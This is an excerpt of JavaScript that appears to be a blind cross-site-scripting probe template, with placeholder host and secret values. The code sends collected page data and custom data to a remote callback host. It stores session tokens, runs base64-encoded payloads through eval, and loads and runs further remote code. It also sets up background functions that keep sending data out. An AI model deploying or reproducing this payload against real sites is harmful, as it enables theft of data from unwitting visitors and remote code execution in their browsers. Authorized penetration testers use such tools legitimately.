...
var PROBE_SECRET = "[PROBE_SECRET]"; // One-time authentication token
...
function contact_mothership(probe_return_data) {
	...
	// Add the one-time probe secret for authentication
	form_data.append('probe_secret', PROBE_SECRET);
        ...
        if(http.readyState == 4 && http.status == 200) {
            try {
                ...
                if (response.payload_id) {
                    // Store the payload_id for background scripts
                    window.xssPayloadId = response.payload_id;
                    console.log('Payload ID stored:', window.xssPayloadId);
                }
                if (response.session_token) {
                    // Store the session token for background authentication
                    window.xssSessionToken = response.session_token;
                    console.log('Session token stored');
                }
                
                // Now that we have authentication tokens, collect pages if configured
                if (window.xssPayloadId && window.xssSessionToken) {
                    collect_pages();
                }
            } catch (e) {
...
function send_collected_page( page_data ) {
    ...
    if (!window.xssPayloadId || !window.xssSessionToken) {
        console.log('Cannot send collected page - missing authentication tokens');
        return;
    }
    ...
    form_data.append('payload_id', window.xssPayloadId);
    form_data.append('session_token', window.xssSessionToken);
...
// Custom payload data collection bridge
window.xssCustomData = [];
window.addCustomData = function(dataObject) {
    if (dataObject && typeof dataObject === 'object' && dataObject.title && dataObject.data) {
        window.xssCustomData.push({
...
// Background data submission for continuous monitoring
window.xssPayloadId = null; // Will be set after initial payload fire

// Function for background scripts to send data after initial fire
window.sendBackgroundData = function(dataObject) {
    // Check if we have a payload ID and session token from the initial fire
    if (!window.xssPayloadId || !window.xssSessionToken) {
        console.warn('No payload ID or session token available yet. Data not sent.');
        return;
    }
    
    // Validate data structure
    if (!dataObject || typeof dataObject !== 'object' || !dataObject.title || !dataObject.data) {
        console.error('Invalid data structure for background submission');
        return;
    }
    
    // Send to background callback endpoint
    var xhr = new XMLHttpRequest();
    var url = "[HOST_URL]/background_callback";
    ...
    xhr.onreadystatechange = function() {
        if (xhr.readyState == 4) {
            if (xhr.status == 200) {
                ...
                console.error('Failed to send background data:', xhr.status);
            }
        }
    };
    
    var payload = JSON.stringify({
        payload_id: window.xssPayloadId,
        session_token: window.xssSessionToken,  // Session token for auth
        custom_data: {
            title: dataObject.title,
            data: dataObject.data,
            timestamp: Date.now()
...
function finishing_moves() {
    // Execute custom payloads FIRST to collect data
    execute_custom_payloads();
    
    // Include custom data collected by payloads
    if (window.xssCustomData && window.xssCustomData.length > 0) {
        probe_return_data['custom_data'] = JSON.stringify(window.xssCustomData);
    }
    
    contact_mothership( probe_return_data );
    // collect_pages() is now called after tokens are received in contact_mothership callback
    if( chainload_uri != "" && chainload_uri != null ) {
        eval_remote_source( chainload_uri );
    }
}

function execute_custom_payloads() {
    try {
        // Custom payloads are embedded during probe generation (base64 encoded and minified)
        var custom_payloads = [CUSTOM_PAYLOADS_REPLACE_ME];
        
        // Execute each embedded payload
        for (var i = 0; i < custom_payloads.length; i++) {
            try {
                // Decode from base64 and execute
                eval(atob(custom_payloads[i]));
            } catch(e) {
                // Log error but continue with next payload
                console.error("Custom payload execution error:", e);
            }
        }
    } catch(e) {
        // Silently fail if payloads array is invalid
        console.error("Failed to execute custom payloads:", e);
    }
}
